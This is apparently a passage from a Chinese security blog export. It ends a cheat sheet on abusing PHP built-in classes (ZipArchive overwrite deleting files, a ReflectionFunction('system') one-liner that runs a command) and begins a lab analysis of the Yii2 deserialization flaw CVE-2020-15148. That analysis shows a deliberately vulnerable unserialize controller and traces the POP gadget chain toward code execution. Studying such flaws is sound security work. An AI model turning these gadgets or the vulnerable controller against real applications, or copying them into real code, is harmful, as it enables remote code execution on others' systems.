    <span class="token keyword">public</span> <span class="token function">renameIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$new_name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">renameName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$new_name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">replaceFile</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$filepath</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">setArchiveComment</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$comment</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">setCommentIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$comment</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">setCommentName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$comment</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">setCompressionIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$compflags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">setCompressionName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$compflags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">setEncryptionIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">setEncryptionName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">setExternalAttributesIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">setExternalAttributesName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">setMtimeIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$timestamp</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">setMtimeName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$timestamp</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">setPassword</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$password</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">statIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
    <span class="token keyword">public</span> <span class="token function">statName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
    <span class="token keyword">public</span> <span class="token function">unchangeAll</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">unchangeArchive</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">unchangeIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">unchangeName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><strong>use</strong>：<code>ZipArchive::open ( string $filename [, int $flags ] ) : mixed</code></p>
<p><strong>flags</strong>：The mode to use to open the archive.</p>
<ul>
<li><strong><code>ZipArchive::OVERWRITE</code></strong>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖。</li>
<li><strong><code>ZipArchive::CREATE</code></strong>：如果不存在则创建一个zip压缩包。</li>
<li><strong><code>ZipArchive::RDONLY</code></strong>：只读模式打开压缩包。 <code>PHP&gt;7.4.3, PECL zip&gt;1.17.1</code></li>
<li><strong><code>ZipArchive::EXCL</code></strong>：如果压缩包已经存在，则出错。</li>
<li><strong><code>ZipArchive::CHECKCONS</code></strong>：对压缩包执行额外的一致性检查，如果失败则显示错误。</li>
</ul>
<p><strong>Demo</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">,</span><span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>目录下的<code>1.txt</code>将会被删除</p>
<h3 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h3><p>注释读取</p>
<p><strong>range</strong>：<code>(PHP 5, PHP 7, PHP 8)</code></p>
<p>方法参考：<a href="https://www.php.net/manual/zh/book.reflection.php">https://www.php.net/manual/zh/book.reflection.php</a></p>
<p><strong>Example Class</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Apple</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$var1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Orange'</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * This is DocComment
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Apple'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>利用php反射类来进行操作</p>
<p><code>ReflectionMethod</code>继承<code>ReflectionFunctionAbstract</code>这个抽象类，这个抽象类实现<code>Reflector</code>接口</p>
<p><code>ReflectionFunctionAbstract</code>中有一个<code>getDocComment</code>方法，用以获取函数的注释文本，注释文本需符合<code>/**</code>开头的规范否则无法识别</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$ref</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionMethod</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Apple"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ref</span><span class="token operator">-></span><span class="token function">getDocComment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"/**
     * This is DocComment
     */"</span></code></pre>

<p>同时这里还有一个<code>ReflectionFunction</code></p>
<p><code>[new ReflectionFunction(&#39;system&#39;),invokeArgs](array(&#39;aaa.txt&#39;=&gt;&#39;dir&#39;));</code>可执行函数调用</p>
<ul>
<li><code>invokeArgs(args)</code>：The passed arguments to the function as an array, much like <a href="https://www.php.net/manual/en/function.call-user-func-array.php">call_user_func_array()</a> works.</li>
</ul>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a href="https://www.cnblogs.com/bmjoker/p/13742666.html">php反序列化从入门到放弃(入门篇)</a></li>
<li><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></li>
<li><a href="https://www.anquanke.com/post/id/238482">PHP 原生类在 CTF 中的利用</a></li>
</ul>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ssrf</tag>
        <tag>反序列化</tag>
        <tag>xxe</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>Yii2反序列化漏洞(CVE-2020-15148)分析学习</title>
    <url>/posts/c79847ee/</url>
    <content><![CDATA[<h3 id="Yii2介绍"><a href="#Yii2介绍" class="headerlink" title="Yii2介绍"></a>Yii2介绍</h3><p>Yii 是一个高性能，基于组件的 PHP 框架，用于快速开发现代 Web 应用程序。即可以用于开发各种用 PHP 构建的 Web 应用。因为基于组件的框架结构和设计精巧的缓存支持，它特别适合开发大型应用， 如门户网站、社区、内容管理系统（CMS）、 电子商务项目和 RESTful Web 服务等。</p>
<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul>
<li>Yii2 &lt; 2.0.38</li>
</ul>
<p>2.0.38已修复，官方给<code>yii\db\BatchQueryResult</code>类加了一个<code>__wakeup()</code>函数，<code>__wakeup</code>方法在类被反序列化时会自动被调用，而这里这么写，目的就是在当BatchQueryResult类被反序列化时就直接报错，避免反序列化的发生，也就避免了漏洞。</p>
<ul>
<li><a href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99">https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99</a></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511165809784.png" alt loading="lazy"></p>
<h3 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h3><p>直接上<code>github</code>将app下载下来解压</p>
<ul>
<li><a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a></li>
</ul>
<p>本地web环境使用<code>phpstudy</code>集成环境搭建，使用<code>phpstorm</code>进行<code>xdebug</code>调试</p>
<p>php version：7.4.3nts，Apache version：2.4.39</p>
<p>修改<code>config\web.php</code>中的<code>cookieValidationKey</code>为任意值，作为<code>yii\web\Request::cookieValidationKey</code>的加密值，不设置会报错</p>
<p>接着自己添加一个<code>controller</code>来进行漏洞的利用，创建一个action：<a href="http://url/index.php?r=test/test">http://url/index.php?r=test/test</a>, controllers的命名是： <code>名称Controller</code>，action的命名是： <code>action名称</code>，如下</p>
<p><code>controllers/TestController.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controllers</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">TestController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">actionTest</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>发包测试，环境搭建成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511191942698.png" alt loading="lazy"></p>
<h3 id="CVE漏洞分析"><a href="#CVE漏洞分析" class="headerlink" title="CVE漏洞分析"></a>CVE漏洞分析</h3><h4 id="POP1"><a href="#POP1" class="headerlink" title="POP1"></a>POP1</h4><p>从<code>yii\db\BatchQueryResult</code>这个类入手，提起主要代码分析：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">// make sure cursor is closed</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">!==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_batch</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_value</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_key</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>可以看到，<code>__destruct</code>调用了<code>reset</code>方法<code>reset</code>调用了<code>close</code>方法，参数<code>_dataReader</code>可控，学习思路后知道这里可以通过触发<code>__call</code>方法来进行利用</p>
<ul>
<li><code>__call</code>：当一个对象在对象上下文中调用不可访问的方法时触发 </li>
</ul>
<p>当一个对象调用不可访问的<code>close</code>方法或者类中压根就没有<code>close</code>方法，即可触发<code>__call</code>，全局搜索<code>__call</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511200257237.png" alt loading="lazy"></p>
<p>找到其中一个<code>Faker/Generator.php</code>类，跟进查看代码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">format</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getFormatter</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getFormatter</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">providers</span> <span class="token keyword">as</span> <span class="token variable">$provider</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$provider</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$provider</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>InvalidArgumentException</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unknown formatter "%s"'</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><code>__call</code>方法调用了类中的<code>format</code>方法，<code>format</code>方法里的<code>call_user_func_array</code>里的参数调用了<code>getFormatter</code>方法</p>
<ul>
<li><p><code>call_user_func_array</code>：调用回调函数，并把一个数组参数作为回调函数的参数</p>
<p>大致使用方法如下</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">foobar</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token constant">__FUNCTION__</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">" got <span class="token interpolation"><span class="token variable">$arg</span></span> and <span class="token interpolation"><span class="token variable">$arg2</span></span>\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">foo</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">bar</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token constant">__METHOD__</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">" got <span class="token interpolation"><span class="token variable">$arg</span></span> and <span class="token interpolation"><span class="token variable">$arg2</span></span>\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// Call the foobar() function with 2 arguments</span>
<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"foobar"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"one"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"two"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Call the $foo->bar() method with 2 arguments</span>
<span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo</span><span class="token punctuation">;</span>
<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$foo</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"bar"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"three"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"four"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

</li>
</ul>
<p><code>getFormatter</code>方法从<code>$this-&gt;$formatter</code>中取值，<code>$this-&gt;formatter</code>可控，所以这里可以调用任意类中的任意方法了。Debug如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511203202841.png" alt loading="lazy"></p>
<p>但是<code>$arguments</code>是从<code>yii\db\BatchQueryResult::reset()</code>里传过来的，我们不可控，比如这里就为空，因为传来的<code>close</code>方法中参参数值，所以我们只能不带参数地去调用别的类中的方法。</p>
<p>到这一步就需要一个执行类，这时需要类中的方法需要满足两个条件</p>
<ol>
<li>方法所需的参数只能是其自己类中存在的（即参数：<code>$this-&gt;args</code>）</li>
<li>方法需要有命令执行功能</li>
</ol>
<p>通过全局查找正则匹配<code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code>来查找，结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511203624162.png" alt loading="lazy"></p>
<ul>
<li><p><code>call_user_func</code>：把第一个参数作为回调函数调用,这里用<code>call_user_func</code>即可达到命令执行的效果也可以达到<code>RCE</code>的效果</p>
<p>大致使用方法如下</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">increment</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$var</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$var</span><span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'increment'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>

<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'increment'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// You can use this instead before PHP 5.3</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

</li>
</ul>
<p>其中有两个类中的<code>run</code>方法可用</p>
<ol>
<li><p><code>yii\rest\CreateAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p>
